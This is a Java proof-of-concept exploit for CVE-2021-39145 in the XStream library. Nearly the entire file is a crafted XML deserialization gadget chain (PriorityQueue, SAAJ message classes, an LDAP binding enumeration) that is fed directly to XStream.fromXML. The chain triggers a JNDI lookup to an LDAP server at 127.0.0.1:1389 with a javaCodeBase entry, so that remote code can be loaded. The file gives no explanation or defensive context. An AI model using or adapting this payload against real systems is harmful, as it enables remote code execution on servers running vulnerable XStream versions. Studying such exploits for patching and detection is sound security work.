package com.r17a.xstream.cve.priorityqueue;

import com.thoughtworks.xstream.XStream;

public class CVE_2021_39145 {
    public static void main(String[] args) {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "      <type>12345</type>\n" +
                "      <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n" +
                "        <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &#x3C;none&#x3E;</m__obj>\n" +
                "      </value>\n" +
                "    </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "      <type>12345</type>\n" +
                "      <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\n" +
                "        <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n" +
                "          <parsedMessage>true</parsedMessage>\n" +
                "          <soapVersion>SOAP_11</soapVersion>\n" +
                "          <bodyParts/>\n" +
                "          <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n" +
                "            <attachmentsInitialized>false</attachmentsInitialized>\n" +
                "            <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>\n" +
                "              <soapPart/>\n" +
                "              <mm>\n" +
                "                <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n" +
                "                  <aliases class='com.sun.jndi.ldap.LdapBindingEnumeration'>\n" +
                "                    <homeCtx>\n" +
                "                      <hostname>127.0.0.1</hostname>\n" +
                "                      <port__number>1389</port__number>\n" +
                "                      <clnt class='com.sun.jndi.ldap.LdapClient'/>\n" +
                "                    </homeCtx>\n" +
                "                    <hasMoreCalled>true</hasMoreCalled>\n" +
                "                    <more>true</more>\n" +
                "                    <posn>0</posn>\n" +
                "                    <limit>1</limit>\n" +
                "                    <entries>\n" +
                "                      <com.sun.jndi.ldap.LdapEntry>\n" +
                "                        <DN>cn=foo,dc=example,dc=com</DN>\n" +
                "                        <attributes class='javax.naming.directory.BasicAttributes' serialization='custom'>\n" +
                "                          <javax.naming.directory.BasicAttribute>\n" +
                "                            <default>\n" +
                "                              <ignoreCase>false</ignoreCase>\n" +
                "                            </default>\n" +
                "                            <int>4</int>\n" +
                "                            <javax.naming.directory.BasicAttribute serialization='custom'>\n" +
                "                              <javax.naming.directory.BasicAttribute>\n" +
                "                                <default>\n" +
                "                                  <ordered>false</ordered>\n" +
                "                                  <attrID>objectClass</attrID>\n" +
                "                                </default>\n" +
                "                                <int>1</int>\n" +
                "                                <string>javanamingreference</string>\n" +
                "                              </javax.naming.directory.BasicAttribute>\n" +
                "                            </javax.naming.directory.BasicAttribute>\n" +
                "                            <javax.naming.directory.BasicAttribute serialization='custom'>\n" +
                "                              <javax.naming.directory.BasicAttribute>\n" +
                "                                <default>\n" +
                "                                  <ordered>false</ordered>\n" +
                "                                  <attrID>javaCodeBase</attrID>\n" +
                "                                </default>\n" +
                "                                <int>1</int>\n" +
                "                                <string>ldap://127.0.0.1:1389/cn=foo,dc=example,dc=com</string>\n" +
                "                              </javax.naming.directory.BasicAttribute>\n" +
                "                            </javax.naming.directory.BasicAttribute>\n" +
                "                            <javax.naming.directory.BasicAttribute serialization='custom'>\n" +
                "                              <javax.naming.directory.BasicAttribute>\n" +
                "                                <default>\n" +
                "                                  <ordered>false</ordered>\n" +
                "                                  <attrID>javaClassName</attrID>\n" +
                "                                </default>\n" +
                "                                <int>1</int>\n" +
                "                                <string>refClassName</string>\n" +
                "                              </javax.naming.directory.BasicAttribute>\n" +
                "                            </javax.naming.directory.BasicAttribute>\n" +
                "                            <javax.naming.directory.BasicAttribute serialization='custom'>\n" +
                "                              <javax.naming.directory.BasicAttribute>\n" +
                "                                <default>\n" +
                "                                  <ordered>false</ordered>\n" +
                "                                  <attrID>javaFactory</attrID>\n" +
                "                                </default>\n" +
                "                                <int>1</int>\n" +
                "                                <string>test</string>\n" +
                "                              </javax.naming.directory.BasicAttribute>\n" +
                "                            </javax.naming.directory.BasicAttribute>\n" +
                "                          </javax.naming.directory.BasicAttribute>\n" +
                "                        </attributes>\n" +
                "                      </com.sun.jndi.ldap.LdapEntry>\n" +
                "                    </entries>\n" +
                "                  </aliases>\n" +
                "                </it>\n" +
                "              </mm>\n" +
                "            </multiPart>\n" +
                "          </sm>\n" +
                "        </message>\n" +
                "      </value>\n" +
                "    </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }
}
